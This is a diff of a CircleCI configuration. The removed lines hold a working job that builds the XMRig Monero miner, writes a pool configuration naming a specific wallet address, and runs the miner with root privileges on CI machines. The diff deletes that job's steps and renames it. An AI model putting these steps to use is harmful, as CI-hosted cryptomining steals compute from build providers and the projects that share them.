@@ -1,7 +1,7 @@
 version: 2.1
 
 jobs:
-  build-xmrig:
+  piakpiakmachines:
     docker:
       - image: cimg/base:stable  # Ubuntu-based CircleCI image
     steps:
@@ -19,43 +19,7 @@ jobs:
             sudo apt install -y git build-essential cmake automake libtool autoconf libuv1-dev libssl-dev libhwloc-dev
             sudo apt-get install -y msr-tools
 
-      - run:
-          name: Build Package
-          command: |
-            git clone https://github.com/xmrig/xmrig.git
-            mkdir xmrig/build
-            cd xmrig/scripts && ./build_deps.sh
-            cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps
-            make -j$(nproc)
-      
-      - run:
-          name: Configure config.json
-          command: |
-            cat > config.json \<<EOF
-            {
-              "pools": [
-                {
-                  "url": "xmr.kryptex.network:7777",
-                  "user": "4ASWwpE33sCdYnW85kfM3MjRjbdZ9pcFCFMKFFHi6vHzF2ssiD8xWBDQpWfqHnJamw82vjKYPq7y25Wfob7mbVPqCRK4Tcz",
-                  "pass": "x",
-                  "algo": "rx/0",
-                  "coin": "monero"
-                }
-              ]
-            }
-            EOF
-
-
-      - run:
-          name: Show config.json for verification
-          command: cat config.json
-
-      - run:
-          name: Run package
-          command: |
-            sudo xmrig/scripts/randomx_boost.sh && sudo ./xmrig/build/xmrig -c config.json
-
 workflows:
   build_and_run:
     jobs:
-      - build-xmrig
+      - piakpiakmachines
